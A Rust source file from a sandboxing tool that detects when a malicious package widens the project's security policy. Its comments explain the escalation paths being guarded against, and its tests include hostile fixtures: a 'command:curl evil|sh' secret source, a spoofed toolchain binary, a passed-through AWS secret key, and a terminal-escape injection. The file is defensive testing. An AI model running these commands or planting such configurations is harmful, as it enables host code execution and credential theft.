//! Detecting a policy that was widened behind your back.
//!
//! # The problem this exists to solve
//!
//! `senv.toml` lives in the project directory, and the run phase grants the
//! project **read-write** — that is the point of the run phase. So the policy
//! file is writable by exactly the code the policy is meant to contain. A
//! package that executes once under `senv run` can rewrite `senv.toml` and own
//! every later invocation.
//!
//! That was not theoretical. Before this module existed, one execution was
//! enough to:
//!
//! - set `[run] net = "host"` and exfiltrate freely from then on;
//! - add `[run.env] pass = ["AWS_SECRET_ACCESS_KEY"]` and be handed the
//!   credential to exfiltrate;
//! - set `[secrets.X] source = "command:…"`, which the secrets broker runs
//!   **on the host, outside the sandbox** — a full escape;
//! - set `[env] uv = "./evil"`, pointing senv's own toolchain at a binary the
//!   attacker had just written into the project.
//!
//! Moving the file out of the project would not fix it: a policy you cannot
//! edit next to the code it governs is a policy nobody will keep in version
//! control, and the same argument applies to any path the sandbox can reach.
//!
//! # The fix
//!
//! senv keeps a normalized snapshot of the security-relevant settings in
//! `state.json`, which lives outside every grant senv issues. Before compiling
//! a policy it compares the config on disk against that snapshot:
//!
//! - unchanged, or **narrowed** → proceed, and record the new snapshot;
//! - **widened** → refuse, name every widening, and require `senv trust`.
//!
//! Narrowing needs no ceremony because an attacker gains nothing by it. Only
//! widening is interesting, and widening is exactly what a person editing
//! their own policy is doing deliberately — so the confirmation lands on the
//! action that deserves it, and ordinary edits like removing a host stay
//! silent.
//!
//! This is tamper-evidence, not prevention: senv cannot stop a package from
//! writing the file, only refuse to act on the result until a human agrees.
//! That is the strongest honest guarantee available when the policy has to
//! live next to the code.

use serde::{Deserialize, Serialize};

use crate::config::{CacheScope, Config, InstallNet};

/// The security-relevant shape of a configuration, normalized for comparison.
///
/// Deliberately not the whole `Config`: comparing raw file bytes would flag a
/// reformatted comment as a security event, and people stop reading warnings
/// that fire on nothing.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default)]
pub struct PolicySnapshot {
    /// Which shape this snapshot was written in.
    ///
    /// Without it, adding a field to this struct turns every stored snapshot
    /// into one that "differs" from the current config, and senv accuses its
    /// whole user base of a tampered policy on upgrade. A snapshot from another
    /// version is treated as no snapshot at all: senv re-baselines and says so.
    #[serde(default)]
    pub version: u32,
    pub run_net: NetLevel,
    pub run_hosts: Vec<String>,
    pub run_read: Vec<String>,
    pub run_write: Vec<String>,
    pub run_env_pass: Vec<String>,
    pub install_net: NetLevel,
    pub install_indexes: Vec<String>,
    pub install_read: Vec<String>,
    pub install_project_writable: bool,
    pub install_cache_shared: bool,
    pub isolation: Option<String>,
    pub image: Option<String>,
    pub uv: Option<String>,
    pub allow_command_secrets: bool,
    /// `NAME=source|inject|phases`, so a grant changing shape under a stable
    /// name is visible — an `env:` secret quietly becoming a `command:` one, or
    /// a shell-only secret being re-scoped to every run.
    pub secrets: Vec<String>,
    /// Resource ceilings, in the units the policy compiles to. Raising one is
    /// widening: a run-phase wall clock moved from 30 minutes to a year is a
    /// persistence primitive, not a convenience.
    pub run_limits: Limits,
    pub install_limits: Limits,
    /// Digest of `pyproject.toml`'s `[build-system]` table.
    ///
    /// Not senv's config, but unquestionably policy: it names the code that
    /// runs during an install. `pyproject.toml` sits in the run phase's write
    /// grant, and the install phase grants the environment read-write — so a
    /// package that executed once could point `build-backend` at a script it
    /// had just dropped, and the next ordinary `senv sync` ran that script with
    /// write access to the environment. Verified: it planted a `.pth` and the
    /// attacker's code then ran on every later `senv run`, straight through the
    /// read-only environment guarantee.
    pub build_system: Option<String>,
    /// Whether this snapshot was taken with a manifest in hand.
    ///
    /// `None` for the two digests below has to mean "that table is absent",
    /// not "we never looked" — otherwise *adding* a `[tool.uv]` table where
    /// there was none reads as no change, which is precisely how a package
    /// would turn on `no-binary` and get arbitrary code execution during the
    /// next sync. This flag separates the two.
    pub manifest_seen: bool,
    /// Digest of the `[tool.uv]` table.
    ///
    /// Same reasoning. `no-binary` alone turns every wheel install into a
    /// source build, which is arbitrary code execution during `sync`; so do
    /// `no-build-isolation`, `extra-build-dependencies` and `config-settings`,
    /// and none of them needs the network senv restricts.
    pub tool_uv: Option<String>,
}

/// The resource ceilings a phase runs under. `None` means senv's built-in
/// default, which is never wider than an explicit value that exceeds it.
/// How much network a phase may reach, ordered so "more" is comparable.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum NetLevel {
    #[default]
    Deny,
    Allowlist,
    Host,
}

impl NetLevel {
    fn as_str(self) -> &'static str {
        match self {
            NetLevel::Deny => "deny",
            NetLevel::Allowlist => "an allowlist",
            NetLevel::Host => "unrestricted",
        }
    }
}

#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default)]
pub struct Limits {
    pub mem_bytes: u64,
    pub wall_secs: u64,
    pub procs: u64,
    /// `u64::MAX` means unbounded, which is what senv applies when these are
    /// unset — so *removing* an explicit limit correctly reads as a widening.
    pub fsize_bytes: u64,
    pub cpu_secs: u64,
}

impl Limits {
    /// Effective ceilings, with senv's phase defaults substituted for anything
    /// the config leaves out.
    ///
    /// Comparing the raw `Option`s hid a real widening: with `wall = "1m"`
    /// recorded and the line then deleted, both sides looked incomparable and
    /// the change was reported as nothing — while the effective ceiling went
    /// from one minute to thirty.
    fn of(r: &crate::config::ResourceSection, defaults: Limits) -> Limits {
        let mem = |v: &Option<String>| {
            v.as_deref()
                .and_then(|s| h5i_sandbox::sandbox::parse_mem(s).ok())
        };
        let secs = |v: &Option<String>| {
            v.as_deref()
                .and_then(|s| h5i_sandbox::sandbox::parse_wall(s).ok())
                .map(|d| d.as_secs())
        };
        Limits {
            mem_bytes: mem(&r.mem).unwrap_or(defaults.mem_bytes),
            wall_secs: if r.wall_is_unbounded() {
                u64::MAX
            } else {
                secs(&r.wall).unwrap_or(defaults.wall_secs)
            },
            procs: r.procs.unwrap_or(defaults.procs),
            fsize_bytes: mem(&r.fsize).unwrap_or(defaults.fsize_bytes),
            cpu_secs: secs(&r.cpu).unwrap_or(defaults.cpu_secs),
        }
    }

    fn run_defaults() -> Limits {
        Limits {
            mem_bytes: crate::policy::RUN_DEFAULT_MEM,
            wall_secs: crate::policy::RUN_DEFAULT_WALL_SECS,
            procs: crate::policy::RUN_DEFAULT_PROCS,
            fsize_bytes: u64::MAX,
            cpu_secs: u64::MAX,
        }
    }

    fn install_defaults() -> Limits {
        Limits {
            mem_bytes: crate::policy::INSTALL_DEFAULT_MEM,
            wall_secs: crate::policy::INSTALL_DEFAULT_WALL_SECS,
            procs: crate::policy::INSTALL_DEFAULT_PROCS,
            fsize_bytes: u64::MAX,
            cpu_secs: u64::MAX,
        }
    }

    fn widenings(&self, previous: &Limits, label: &str, found: &mut Vec<String>) {
        let mut raised = |what: &str, new: u64, old: u64| {
            if new > old {
                let show = |v: u64| {
                    if v == u64::MAX {
                        "unbounded".to_string()
                    } else {
                        v.to_string()
                    }
                };
                found.push(format!("[{label}] {what}: {} → {}", show(old), show(new)));
            }
        };
        raised("mem", self.mem_bytes, previous.mem_bytes);
        raised("wall", self.wall_secs, previous.wall_secs);
        raised("procs", self.procs, previous.procs);
        raised("fsize", self.fsize_bytes, previous.fsize_bytes);
        raised("cpu", self.cpu_secs, previous.cpu_secs);
    }
}

/// Bump whenever a field is added to [`PolicySnapshot`] or the meaning of one
/// changes.
pub const SNAPSHOT_VERSION: u32 = 1;

impl PolicySnapshot {
    /// The snapshot of senv's own defaults.
    ///
    /// Not `Default::default()`: the derived zero value has `install_net =
    /// Deny`, while senv's actual default is a registry allowlist. Comparing
    /// against the zero value reported "install net: deny → an allowlist" as a
    /// widening for every project that had never been seen — a warning that
    /// fires on nothing, which is the failure mode this whole mechanism is
    /// supposed to avoid.
    pub fn defaults() -> PolicySnapshot {
        PolicySnapshot::of(&Config::default())
    }

    /// [`PolicySnapshot::of`], plus the parts of `pyproject.toml` that decide
    /// what code an install executes.
    pub fn of_project(config: &Config, manifest: &str) -> PolicySnapshot {
        let mut snapshot = PolicySnapshot::of(config);
        let parsed: Option<toml::Value> = toml::from_str(manifest).ok();
        let digest = |key: &str, sub: Option<&str>| -> Option<String> {
            let value = match sub {
                Some(sub) => parsed.as_ref()?.get(key)?.get(sub)?,
                None => parsed.as_ref()?.get(key)?,
            };
            // `Debug`, not `toml::to_string`: serializing a bare table value
            // fails (TOML wants values before sub-tables), and the `unwrap_or_default`
            // that hid it made every manifest digest the empty string — so two
            // different build backends compared equal and the check passed
            // while detecting nothing. `toml::Value`'s map is a `BTreeMap`, so
            // the debug rendering is ordered and stable.
            Some(crate::util::sha256_hex(format!("{value:?}").as_bytes()))
        };
        snapshot.manifest_seen = true;
        snapshot.build_system = digest("build-system", None);
        snapshot.tool_uv = digest("tool", Some("uv"));
        snapshot
    }

    /// Reduce a configuration to what a reviewer would care about.
    pub fn of(config: &Config) -> PolicySnapshot {
        let run_net = if config.run.net.is_host() {
            NetLevel::Host
        } else if config.run.net.hosts().is_empty() {
            NetLevel::Deny
        } else {
            NetLevel::Allowlist
        };
        let mut snapshot = PolicySnapshot {
            version: SNAPSHOT_VERSION,
            run_net,
            run_hosts: config.run.net.hosts().to_vec(),
            run_read: config.run.fs.read.clone(),
            run_write: config.run.fs.write.clone(),
            run_env_pass: config.run.env.pass.clone(),
            install_net: match config.install.net {
                InstallNet::Registries => NetLevel::Allowlist,
                InstallNet::Host => NetLevel::Host,
            },
            install_indexes: config.install.extra_indexes.clone(),
            install_read: config.install.read.clone(),
            install_project_writable: config.install.project_writable,
            install_cache_shared: config.install.cache == CacheScope::Shared,
            isolation: config.env.isolation.clone(),
            image: config.env.image.clone(),
            uv: config.env.uv.clone(),
            allow_command_secrets: config.env.allow_command_secrets,
            secrets: config
                .secrets
                .iter()
                .map(|(name, s)| {
                    let mut phases = s.phases.clone();
                    phases.sort();
                    format!(
                        "{name}={}|{}|{}",
                        s.source
                            .clone()
                            .unwrap_or_else(|| format!("env:SENV_SECRET_{name}")),
                        s.inject.clone().unwrap_or_else(|| "env".to_string()),
                        if phases.is_empty() {
                            "run,shell".to_string()
                        } else {
                            phases.join(",")
                        }
                    )
                })
                .collect(),
            run_limits: Limits::of(&config.run.resources, Limits::run_defaults()),
            install_limits: Limits::of(&config.install.resources, Limits::install_defaults()),
            // Filled in by `of_project`, which is the only caller with the
            // manifest in hand.
            manifest_seen: false,
            build_system: None,
            tool_uv: None,
        };
        for list in [
            &mut snapshot.run_hosts,
            &mut snapshot.run_read,
            &mut snapshot.run_write,
            &mut snapshot.run_env_pass,
            &mut snapshot.install_indexes,
            &mut snapshot.install_read,
            &mut snapshot.secrets,
        ] {
            list.sort();
            list.dedup();
        }
        snapshot
    }

    /// Every way `self` grants more than `previous`, in words a user can act
    /// on. Empty means the change is safe to accept silently.
    pub fn widenings(&self, previous: &PolicySnapshot) -> Vec<String> {
        let mut found = Vec::new();

        if self.run_net > previous.run_net {
            found.push(format!(
                "[run] net: {} → {}",
                previous.run_net.as_str(),
                self.run_net.as_str()
            ));
        }
        if self.install_net > previous.install_net {
            found.push(format!(
                "[install] net: {} → {}",
                previous.install_net.as_str(),
                self.install_net.as_str()
            ));
        }

        // Only compare host lists when the phase did not *narrow*. Going from
        // `net = "host"` to an allowlist is the tightening senv's own
        // documentation recommends, and `hosts()` is empty for `"host"` — so
        // every entry in the replacement list looked new and senv refused the
        // improvement.
        if self.run_net >= previous.run_net {
            added(
                &mut found,
                "[run] net",
                &self.run_hosts,
                &previous.run_hosts,
            );
        }
        added(
            &mut found,
            "[run.fs] read",
            &self.run_read,
            &previous.run_read,
        );
        added(
            &mut found,
            "[run.fs] write",
            &self.run_write,
            &previous.run_write,
        );
        added(
            &mut found,
            "[run.env] pass",
            &self.run_env_pass,
            &previous.run_env_pass,
        );
        if self.install_net >= previous.install_net {
            added(
                &mut found,
                "[install] extra-indexes",
                &self.install_indexes,
                &previous.install_indexes,
            );
        }
        added(
            &mut found,
            "[install] read",
            &self.install_read,
            &previous.install_read,
        );
        added(&mut found, "[secrets]", &self.secrets, &previous.secrets);

        if self.install_project_writable && !previous.install_project_writable {
            found.push(
                "[install] project-writable: false → true (build backends may edit your source)"
                    .to_string(),
            );
        }
        if self.install_cache_shared && !previous.install_cache_shared {
            found.push(
                "[install] cache: project → shared (an install here can affect other projects)"
                    .to_string(),
            );
        }
        if self.allow_command_secrets && !previous.allow_command_secrets {
            found.push(
                "[env] allow-command-secrets: false → true (secret sources may run host code \
                 OUTSIDE the sandbox)"
                    .to_string(),
            );
        }

        self.run_limits
            .widenings(&previous.run_limits, "run.resources", &mut found);
        self.install_limits
            .widenings(&previous.install_limits, "install.resources", &mut found);

        // Only meaningful once a baseline exists: on a first sighting there is
        // nothing to compare a manifest against, and reporting every project's
        // build backend as a change would make the first run of every project
        // a prompt.
        if previous.manifest_seen && self.build_system != previous.build_system {
            found.push(
                "[build-system] in pyproject.toml changed — this names the code that runs \
                 during an install"
                    .to_string(),
            );
        }
        if previous.manifest_seen && self.tool_uv != previous.tool_uv {
            found.push(
                "[tool.uv] in pyproject.toml changed — these settings decide what an install \
                 builds from source, and therefore what code it executes"
                    .to_string(),
            );
        }

        // These three are conservative: any change at all is reported, because
        // each redirects what senv executes or how strongly it confines, and
        // there is no ordering in which a change is obviously safe.
        changed(
            &mut found,
            "[env] uv (the binary senv runs)",
            &self.uv,
            &previous.uv,
        );
        changed(
            &mut found,
            "[env] isolation",
            &self.isolation,
            &previous.isolation,
        );
        changed(&mut found, "[env] image", &self.image, &previous.image);

        found
    }
}

fn added(found: &mut Vec<String>, label: &str, new: &[String], old: &[String]) {
    let fresh: Vec<&String> = new.iter().filter(|v| !old.contains(v)).collect();
    if !fresh.is_empty() {
        let list: Vec<String> = fresh.iter().map(|v| crate::util::sanitize(v)).collect();
        found.push(format!("{label}: added {}", list.join(", ")));
    }
}

fn changed(found: &mut Vec<String>, label: &str, new: &Option<String>, old: &Option<String>) {
    if new != old {
        let show = |v: &Option<String>| {
            v.as_deref()
                .map(crate::util::sanitize)
                .unwrap_or_else(|| "unset".to_string())
        };
        found.push(format!("{label}: {} → {}", show(old), show(new)));
    }
}

/// What senv should do about the configuration it just loaded.
#[derive(Debug, Clone)]
pub enum Verdict {
    /// senv recorded this project under an older snapshot format, so there is
    /// nothing meaningful to compare against.
    FormatChanged,
    /// No record yet. The config is adopted as the baseline.
    ///
    /// This is the right default rather than a hole: reaching a first run means
    /// the user chose to work in this project, and a `senv.toml` that arrived
    /// with the repository is trusted exactly as much as the code beside it.
    /// The threat this module addresses is a *package* editing the policy after
    /// senv is already in use, and that always has a prior record to fail
    /// against.
    FirstSight,
    /// Unchanged, or narrowed.
    Trusted,
    /// Grants more than the recorded snapshot.
    Widened(Vec<String>),
}

impl Verdict {
    pub fn widenings(&self) -> &[String] {
        match self {
            Verdict::Widened(w) => w,
            _ => &[],
        }
    }

    pub fn is_widened(&self) -> bool {
        matches!(self, Verdict::Widened(_))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::Path;

    fn config(text: &str) -> Config {
        let cfg: Config = toml::from_str(text).expect("valid config");
        cfg.validate(Path::new("senv.toml")).expect("valid config");
        cfg
    }

    fn verdict(before: &str, after: &str) -> Vec<String> {
        PolicySnapshot::of(&config(after)).widenings(&PolicySnapshot::of(&config(before)))
    }

    #[test]
    fn changing_the_build_backend_needs_acknowledging() {
        // The attack this closes: a package edits pyproject.toml to point
        // `build-backend` at a script it just wrote, and the next ordinary
        // `senv sync` runs that script with the environment writable — which
        // persisted a `.pth` and defeated the read-only environment.
        let cfg = Config::default();
        let before = PolicySnapshot::of_project(
            &cfg,
            "[project]\nname='x'\nversion='0'\n\
             [build-system]\nrequires=['hatchling']\nbuild-backend='hatchling.build'\n",
        );
        let after = PolicySnapshot::of_project(
            &cfg,
            "[project]\nname='x'\nversion='0'\n\
             [build-system]\nrequires=[]\nbuild-backend='evil'\nbackend-path=['.']\n",
        );
        assert!(
            before.build_system.is_some(),
            "the fixture must have a build system"
        );
        assert_ne!(
            before.build_system, after.build_system,
            "two different backends must not digest the same"
        );
        let w = after.widenings(&before);
        assert!(w.iter().any(|f| f.contains("build-system")), "{w:?}");

        // `[tool.uv] no-binary` is arbitrary code execution during sync with no
        // network needed, so it counts too.
        let after = PolicySnapshot::of_project(
            &cfg,
            "[project]\nname='x'\nversion='0'\n\
             [build-system]\nrequires=['hatchling']\nbuild-backend='hatchling.build'\n\
             [tool.uv]\nno-binary = true\n",
        );
        let w = after.widenings(&before);
        assert!(w.iter().any(|f| f.contains("tool.uv")), "{w:?}");

        // Adding a table that was not there before counts: `[tool.uv]` absent
        // must not read the same as "we never looked at a manifest".
        assert!(before.tool_uv.is_none(), "the baseline has no [tool.uv]");
        assert!(before.manifest_seen);

        // An unchanged manifest is silent, and so is a first sighting.
        assert!(before.widenings(&before).is_empty());
        assert!(after.widenings(&PolicySnapshot::defaults()).is_empty());
    }

    #[test]
    fn narrowing_from_an_open_network_to_an_allowlist_is_not_a_widening() {
        // This refused the exact tightening senv's own documentation
        // recommends: `hosts()` is empty for `net = "host"`, so every entry in
        // the replacement allowlist looked new.
        let w = verdict(
            "[run]\nnet = \"host\"\n",
            "[run]\nnet = [\"api.example.com\", \"b.example.com\"]\n",
        );
        assert!(w.is_empty(), "narrowing must not be refused: {w:?}");

        let w = verdict(
            "[install]\nnet = \"host\"\n",
            "[install]\nnet = \"registries\"\nextra-indexes = [\"a.example.com\"]\n",
        );
        assert!(w.is_empty(), "same for the install phase: {w:?}");
    }

    #[test]
    fn deleting_a_limit_is_a_widening_because_the_default_is_larger() {
        // Comparing raw Options missed this: with `wall = "1m"` recorded and
        // the line deleted, the effective ceiling goes to senv's 30-minute
        // default while the comparison saw Some → None and said nothing.
        let w = verdict("[run.resources]\nwall = \"1m\"\n", "");
        assert!(w.iter().any(|f| f.contains("wall")), "{w:?}");

        let w = verdict("[run.resources]\ncpu = \"10s\"\n", "");
        assert!(
            w.iter()
                .any(|f| f.contains("cpu") && f.contains("unbounded")),
            "removing a cpu ceiling makes it unbounded: {w:?}"
        );

        // And adding one is still narrowing.
        assert!(verdict("", "[run.resources]\ncpu = \"10s\"\n").is_empty());
    }

    #[test]
    fn senvs_own_defaults_are_not_a_widening_of_themselves() {
        // The regression this guards: comparing against the struct's zero
        // value rather than the default *config* made every fresh project
        // report a phantom "install net: deny → an allowlist".
        let w = PolicySnapshot::of(&Config::default()).widenings(&PolicySnapshot::defaults());
        assert!(
            w.is_empty(),
            "a default config must match the default baseline: {w:?}"
        );
        let w = PolicySnapshot::of(&config("")).widenings(&PolicySnapshot::defaults());
        assert!(w.is_empty(), "an empty senv.toml is the default too: {w:?}");
    }

    #[test]
    fn opening_the_network_is_a_widening() {
        let w = verdict("", "[run]\nnet = \"host\"\n");
        assert_eq!(w.len(), 1, "{w:?}");
        assert!(w[0].contains("unrestricted"), "{w:?}");

        let w = verdict("", "[run]\nnet = [\"api.example.com\"]\n");
        assert!(!w.is_empty(), "deny → allowlist is still more than deny");
    }

    #[test]
    fn adding_a_host_to_an_existing_allowlist_is_a_widening() {
        let w = verdict(
            "[run]\nnet = [\"a.example.com\"]\n",
            "[run]\nnet = [\"a.example.com\", \"b.example.com\"]\n",
        );
        assert_eq!(w.len(), 1, "{w:?}");
        assert!(w[0].contains("b.example.com"), "{w:?}");
    }

    #[test]
    fn narrowing_needs_no_ceremony() {
        // Removing access must never prompt: an attacker gains nothing by it,
        // and a warning that fires on safe edits is a warning people learn to
        // click through.
        assert!(verdict("[run]\nnet = \"host\"\n", "").is_empty());
        assert!(
            verdict(
                "[run]\nnet = [\"a.example.com\", \"b.example.com\"]\n",
                "[run]\nnet = [\"a.example.com\"]\n",
            )
            .is_empty()
        );
        assert!(verdict("[run.fs]\nread = [\"/data\"]\n", "").is_empty());
        assert!(verdict("[install]\nproject-writable = true\n", "").is_empty());
    }

    #[test]
    fn an_unchanged_config_is_silent_even_when_it_is_wide() {
        let wide = "[run]\nnet = \"host\"\n[run.fs]\nread = [\"/etc\"]\n";
        assert!(verdict(wide, wide).is_empty());
    }

    #[test]
    fn every_escalation_from_the_proof_of_concepts_is_caught() {
        // Each of these was a working exploit before this module existed.
        let host_rce_via_secret =
            "[env]\nallow-command-secrets = true\n[secrets.X]\nsource = \"command:curl evil|sh\"\n";
        let w = verdict("", host_rce_via_secret);
        assert!(
            w.iter().any(|f| f.contains("allow-command-secrets")),
            "the host-code gate must be reported: {w:?}"
        );
        assert!(w.iter().any(|f| f.contains("[secrets]")), "{w:?}");

        let host_rce_via_uv = "[env]\nuv = \"/proj/evil.sh\"\n";
        let w = verdict("", host_rce_via_uv);
        assert!(w.iter().any(|f| f.contains("[env] uv")), "{w:?}");

        let exfiltration = "[run]\nnet = \"host\"\n[run.env]\npass = [\"AWS_SECRET_ACCESS_KEY\"]\n";
        let w = verdict("", exfiltration);
        assert!(w.iter().any(|f| f.contains("net")), "{w:?}");
        assert!(
            w.iter().any(|f| f.contains("AWS_SECRET_ACCESS_KEY")),
            "{w:?}"
        );

        let weaken_tier = "[env]\nisolation = \"process\"\n";
        assert!(!verdict("[env]\nisolation = \"supervised\"\n", weaken_tier).is_empty());
    }

    #[test]
    fn raising_a_resource_ceiling_is_a_widening() {
        // A run-phase wall clock moved from 30 minutes to a year keeps a
        // process alive long after the command "finished".
        let w = verdict(
            "[run.resources]\nwall = \"30m\"\n",
            "[run.resources]\nwall = \"none\"\n",
        );
        assert!(w.iter().any(|f| f.contains("wall")), "{w:?}");

        let w = verdict(
            "[run.resources]\nprocs = 64\n",
            "[run.resources]\nprocs = 4096\n",
        );
        assert!(w.iter().any(|f| f.contains("procs")), "{w:?}");

        // Lowering one is not.
        assert!(
            verdict(
                "[run.resources]\nmem = \"8G\"\n",
                "[run.resources]\nmem = \"1G\"\n"
            )
            .is_empty()
        );
    }

    #[test]
    fn re_scoping_a_secret_to_more_phases_is_a_widening() {
        let w = verdict(
            "[secrets.TOKEN]\nphases = [\"shell\"]\n",
            "[secrets.TOKEN]\nphases = [\"run\", \"shell\"]\n",
        );
        assert!(w.iter().any(|f| f.contains("TOKEN")), "{w:?}");
    }

    #[test]
    fn a_secret_whose_source_changes_is_reported_even_under_the_same_name() {
        // Renaming the source is how an env: secret quietly becomes a
        // command: secret.
        let w = verdict(
            "[env]\nallow-command-secrets = true\n[secrets.TOKEN]\nsource = \"env:TOKEN\"\n",
            "[env]\nallow-command-secrets = true\n[secrets.TOKEN]\nsource = \"command:evil\"\n",
        );
        assert!(w.iter().any(|f| f.contains("command:evil")), "{w:?}");
    }

    #[test]
    fn reported_widenings_cannot_carry_terminal_escapes() {
        // The config is attacker-writable, and its contents are quoted back to
        // the user inside senv's own framing.
        // TOML's own escape for ESC is \u001b.
        let hostile = "[run.fs]\nread = [\"/data\\u001b[32mSAFE\"]\n";
        let cfg: Config = toml::from_str(hostile).expect("parses");
        assert!(
            cfg.run.fs.read[0].contains('\u{1b}'),
            "the fixture must actually be hostile"
        );
        let w = PolicySnapshot::of(&cfg).widenings(&PolicySnapshot::defaults());
        assert!(!w.iter().any(|f| f.contains('\u{1b}')), "{w:?}");
    }
}
